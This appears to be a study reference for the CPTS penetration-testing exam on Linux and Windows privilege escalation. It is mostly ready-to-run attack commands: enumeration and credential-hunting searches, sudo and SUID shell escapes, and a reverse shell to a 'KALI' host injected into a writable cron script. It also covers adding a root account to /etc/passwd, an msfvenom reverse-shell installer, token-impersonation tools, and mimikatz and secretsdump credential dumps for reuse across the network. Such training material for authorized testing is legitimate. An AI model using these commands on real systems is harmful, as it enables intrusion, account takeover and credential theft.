# 23/24 — Privilege Escalation (Linux & Windows)

Privesc on the CPTS is the same skillset as the OSCP — the techniques don't change. This module is a condensed reference with the CPTS-specific emphasis: credential harvesting for lateral movement. On the CPTS, privesc isn't just about getting root/SYSTEM — it's about finding credentials that unlock the next machine in the chain.

---

## Linux Privilege Escalation

### Enumeration sequence (run in this order)

```bash
# 1. Who am I and what can I do?
whoami && id
sudo -l                              # FIRST CHECK — often the answer

# 2. What's on this system?
uname -a                             # kernel version (for kernel exploits)
cat /etc/os-release                  # exact OS version

# 3. SUID binaries
find / -perm -4000 -type f 2>/dev/null
# Cross-reference with GTFOBins: gtfobins.github.io

# 4. Capabilities
getcap -r / 2>/dev/null
# Look for: cap_setuid (python3, perl, etc.)

# 5. Cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
cat /etc/cron.d/*
# Look for: scripts you can write to, PATH manipulation

# 6. Writable files
ls -la /etc/passwd                   # writable? add a root user
find / -writable -type f 2>/dev/null | grep -v "proc\|sys" | head -30

# 7. Network (find more targets for lateral movement)
ip a                                 # what networks am I on?
ip route                             # routing table
arp -a                               # nearby hosts
ss -tlnp                             # listening services
cat /etc/hosts                       # internal hostnames

# 8. CREDENTIAL HUNTING (most important for CPTS)
find / -name "*.conf" -exec grep -li "pass" {} \; 2>/dev/null
find / -name "*.php" -exec grep -li "password" {} \; 2>/dev/null
find / -name "*.yml" -exec grep -li "password" {} \; 2>/dev/null
find / -name "id_rsa" 2>/dev/null
cat ~/.bash_history
env | grep -i pass

# 9. Automated — run LinPEAS
./linpeas.sh | tee linpeas_output.txt
```

### Common Linux privesc vectors

```
sudo -l findings → check GTFOBins:
  sudo vim -c ':!bash'
  sudo find / -exec /bin/bash \; -quit
  sudo python3 -c 'import os; os.system("/bin/bash")'
  sudo env /bin/bash
  sudo less /etc/shadow  (then !bash)
  sudo nmap --interactive (then !sh) — older nmap versions

SUID binaries → check GTFOBins:
  /usr/local/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
  /usr/local/bin/bash -p
  /usr/local/bin/find . -exec /bin/bash -p \;

Writable cron scripts:
  echo 'bash -i >& /dev/tcp/KALI/4444 0>&1' >> /opt/scripts/cron_script.sh
  # Wait for cron to execute

Writable /etc/passwd:
  openssl passwd -1 hacked
  echo 'hacked:HASH:0:0::/root:/bin/bash' >> /etc/passwd
  su hacked

Capabilities:
  /usr/bin/python3 with cap_setuid → os.setuid(0); os.system("/bin/bash")

Kernel exploits (last resort):
  PwnKit (CVE-2021-4034) — works on almost all unpatched Linux
  Dirty Pipe (CVE-2022-0847) — kernel 5.8-5.16
```

---

## Windows Privilege Escalation

### Enumeration sequence

```cmd
:: 1. Who am I and what privileges do I have?
whoami /all
:: Look for: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege

:: 2. System info
systeminfo | findstr /i "OS Name\|OS Version\|Hotfix"

:: 3. Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """"

:: 4. Weak service permissions
:: Use accesschk.exe or PowerUp.ps1

:: 5. AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul

:: 6. Stored credentials
cmdkey /list

:: 7. Autologon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "Default"

:: 8. Scheduled tasks
schtasks /query /fo list /v

:: 9. CREDENTIAL HUNTING (most important for CPTS)
findstr /si "password" C:\*.txt C:\*.ini C:\*.config C:\*.xml 2>nul
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
dir /s /b C:\Users\*.kdbx C:\Users\*.key C:\Users\*id_rsa* 2>nul
dir /s /b C:\inetpub\*.config 2>nul

:: 10. Network info (find more targets)
ipconfig /all
arp -a
netstat -ano
route print
net view

:: 11. Domain info (if domain-joined)
net user /domain
net group "Domain Admins" /domain
nltest /dclist:domain.com

:: 12. Automated — run WinPEAS
.\winpeas.exe
```

### Common Windows privesc vectors

```
SeImpersonatePrivilege (service accounts, IIS, SQL):
  PrintSpoofer.exe -i -c cmd.exe
  GodPotato.exe -cmd "cmd /c whoami"
  JuicyPotato.exe (older Windows)
  → Escalates from service account to SYSTEM

Unquoted service path:
  Place payload at the path break point
  Restart service → payload runs as SYSTEM

Weak service binary permissions:
  Replace the service binary with your payload
  Restart service → payload runs as SYSTEM

AlwaysInstallElevated:
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f msi -o evil.msi
  msiexec /quiet /qn /i evil.msi
  → Installs as SYSTEM

Stored credentials (cmdkey):
  runas /savecred /user:Administrator cmd.exe
  → No password prompt needed

Autologon password in registry:
  Admin password stored in plaintext → runas

Scheduled task with writable script:
  Inject payload into writable script
  Wait for scheduled execution as SYSTEM/Admin
```

---

## CPTS-Specific Privesc Focus: Credential Harvesting

**On the CPTS, privesc is a MEANS, not the END.** You escalate to root/SYSTEM primarily to:

```
1. DUMP CREDENTIALS
   Linux:  cat /etc/shadow → crack hashes → try on other hosts
   Windows: mimikatz → hashdump → secretsdump → try on other hosts
   
2. READ PROTECTED FILES
   Config files only readable by root
   Application databases
   SSH keys in /root/.ssh/
   
3. ACCESS INTERNAL NETWORKS
   Sometimes root is needed to modify routing or firewall rules
   
4. DUMP DOMAIN CREDENTIALS (Windows)
   secretsdump requires local admin
   mimikatz requires SeDebugPrivilege (admin/SYSTEM)
   → These credentials unlock the rest of the AD network
```

### Post-privesc credential extraction

```bash
# Linux — after getting root
cat /etc/shadow                      # crack with john/hashcat
find / -name "*.conf" -exec grep -li "password" {} \;
cat /root/.bash_history
ls /root/.ssh/                       # SSH keys for other hosts
find /opt -name "*.yml" -o -name "*.env" | xargs grep -li "pass" 2>/dev/null

# Windows — after getting SYSTEM/Admin
# Remote credential dump
impacket-secretsdump admin:pass@TARGET_IP

# On the machine itself
mimikatz# sekurlsa::logonpasswords    # cached plaintext + hashes
mimikatz# lsadump::sam                # local accounts
mimikatz# lsadump::dcsync /user:administrator  # if on a DC

# Check for saved browser passwords, KeePass databases, etc.
dir /s /b C:\Users\*.kdbx 2>nul
dir /s /b "C:\Users\*Login Data*" 2>nul
```

**After extracting credentials, immediately test them on every other host in the network.** This is the CPTS credential reuse loop that chains the entire engagement together.
